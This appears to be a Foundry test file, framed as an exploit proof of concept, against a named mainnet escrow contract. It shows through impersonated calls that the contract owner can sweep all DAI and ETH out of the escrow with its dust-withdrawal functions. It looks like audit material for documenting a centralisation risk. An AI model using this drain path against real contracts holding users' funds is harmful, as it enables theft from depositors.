```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function balanceOf(address) external view returns (uint);
    function transferFrom(address src, address dst, uint wad) external returns (bool);
    function approve(address guy, uint wad) external returns (bool);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IEscrow {
    function owner() external view returns (address);
    function WETH() external view returns (address);
    function router() external view returns (address);
    function setSpender(address _spender) external;
    function setRouter(address _router) external;
    function balanceOf(address _owner) external view returns (uint256);
    function deposit() external payable;
    function withdraw(address _to, uint256 _amount) external;
    function multiSendETH(address[] calldata _recipients, uint256[] calldata _amounts) external payable;
    function multiWithdrawETH(address[] calldata _recipients, uint256[] calldata _amounts, uint256 _totalAmount) external;
    function buy(address _token, address[] calldata _recipients, uint256[] calldata _amountIns, uint256[] calldata _maxOuts) external;
    function sell(address _token, address[] calldata _sellers, uint256[] calldata _amountIns, bool _isPercent) external;
    function withdrawDustToken(address _token, address _to) external returns (bool);
    function withdrawDustETH(address _to) external;
    function renounceOwnership() external;
    function transferOwnership(address newOwner) external;
}

contract ExploitTest is Test {
    address constant ESCROW = 0x89d7c52b999DE0f2D862eD944203BFA0526AE973;
    // Use a well-known token that is not WETH, e.g., DAI (mainnet)
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    // WETH on mainnet
    address constant WETH_MAINNET = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    IEscrow escrow;
    IERC20 dai;
    address owner;
    address attacker;

    function setUp() public {
        vm.label(ESCROW, "Escrow");
        vm.label(DAI, "DAI");
        vm.label(WETH_MAINNET, "WETH");

        escrow = IEscrow(ESCROW);
        dai = IERC20(DAI);

        // Get owner from the contract
        owner = escrow.owner();
        vm.label(owner, "Owner");

        // Use a random address as attacker (just a label)
        attacker = address(0xBEEF);
        vm.label(attacker, "Attacker");

        // Ensure the owner is not zero
        assertTrue(owner != address(0));
    }

    function testOwnerCanWithdrawDustToken() public {
        // --- Setup: seed the Escrow contract with some DAI ---
        uint256 dustAmount = 1000 * 1e18; // 1000 DAI
        deal(DAI, ESCROW, dustAmount);

        uint256 beforeBalance = dai.balanceOf(ESCROW);
        assertEq(beforeBalance, dustAmount, "Escrow should have dust DAI");

        uint256 ownerBeforeBalance = dai.balanceOf(owner);
        assertEq(ownerBeforeBalance, 0, "Owner should have 0 DAI initially");

        // --- Exploit: owner calls withdrawDustToken to sweep the DAI ---
        vm.prank(owner);
        bool sent = escrow.withdrawDustToken(DAI, owner);
        assertTrue(sent, "withdrawDustToken should succeed");

        // --- Assertions ---
        uint256 afterBalance = dai.balanceOf(ESCROW);
        assertEq(afterBalance, 0, "Escrow should have no DAI left");

        uint256 ownerAfterBalance = dai.balanceOf(owner);
        assertEq(ownerAfterBalance, dustAmount, "Owner should have received all DAI");
    }

    function testOwnerCanWithdrawDustETH() public {
        // --- Setup: send some ETH dust to Escrow (via receive()) ---
        uint256 dustETH = 10 ether;
        vm.deal(ESCROW, dustETH);

        uint256 escrowBalanceBefore = address(ESCROW).balance;
        assertEq(escrowBalanceBefore, dustETH, "Escrow should have ETH");

        uint256 ownerBalanceBefore = owner.balance;
        // Note: owner may already have ETH, we just check delta

        // Record owner balance before
        uint256 ownerBefore = owner.balance;

        // --- Exploit: owner calls withdrawDustETH to sweep ETH ---
        vm.prank(owner);
        escrow.withdrawDustETH(owner);

        // --- Assertions ---
        uint256 escrowBalanceAfter = address(ESCROW).balance;
        assertEq(escrowBalanceAfter, 0, "Escrow should have no ETH left");

        uint256 ownerAfter = owner.balance;
        assertEq(ownerAfter - ownerBefore, dustETH, "Owner should have gained the ETH");
    }
}
```
